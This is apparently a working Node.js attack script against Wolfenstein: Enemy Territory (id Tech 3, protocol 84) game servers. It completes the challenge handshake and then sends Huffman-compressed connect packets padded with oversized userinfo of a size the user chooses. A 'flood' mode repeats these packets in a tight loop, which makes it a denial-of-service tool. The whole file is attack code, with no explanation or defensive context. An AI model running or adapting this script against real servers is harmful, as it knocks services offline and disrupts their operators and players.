const dgram = require('dgram');
const socket = dgram.createSocket('udp4');
const crypto = require('crypto');
const addon = require('bindings')('addon.node');

const reqGetChallenge = Buffer.from('\xFF\xFF\xFF\xFFgetchallenge\n', 'binary');
const args = process.argv.slice(2);

const server = {
  ip: args[0],
  port: args[1] ? parseInt(args[1]) : 27960
};

const size = parseInt(args[2]);

const flood = args.includes('flood');

socket.send(reqGetChallenge, 0, reqGetChallenge.length, server.port, server.ip, err => {
  if (err) throw err;
  console.log('getchallenge');
});


const guid = crypto.randomBytes(16).toString('hex').toUpperCase();
const qport = Math.floor(Math.random() * 65536);

let count = 0;
const sendConnect = challenge => {
  count++;
  const data = Buffer.from(`\xFF\xFF\xFF\xFFconnect "\\name\\ETPlayer\\rate\\25000\\snaps\\20\\cl_punkbuster\\1\\cl_guid\\${guid}\\protocol\\84\\qport\\${qport}\\challenge\\${challenge}${'\\a\\b'.repeat(size / 2)}"`, 'binary');
  const len = addon.Huff_Compress(data, 12, data.length);
  socket.send(data, 0, len, server.port, server.ip, err => {
    if (err) throw err;
    if (flood) process.stdout.write('\rreq ' + count);
  });
  if (flood) setImmediate(() => sendConnect(challenge));
};

socket.on('message', msg => {
  const raw = msg.toString('binary');
  if (raw.startsWith('\xFF\xFF\xFF\xFFchallengeResponse')) {
    const challenge = raw.substr(22);
    console.log('challenge', challenge);
    sendConnect(challenge);
  } else if (raw.startsWith('\xFF\xFF\xFF\xFFconnectResponse')) {
    console.log(raw.substr(4));
  } else {
    console.log('unk pkt', raw);
  }
});
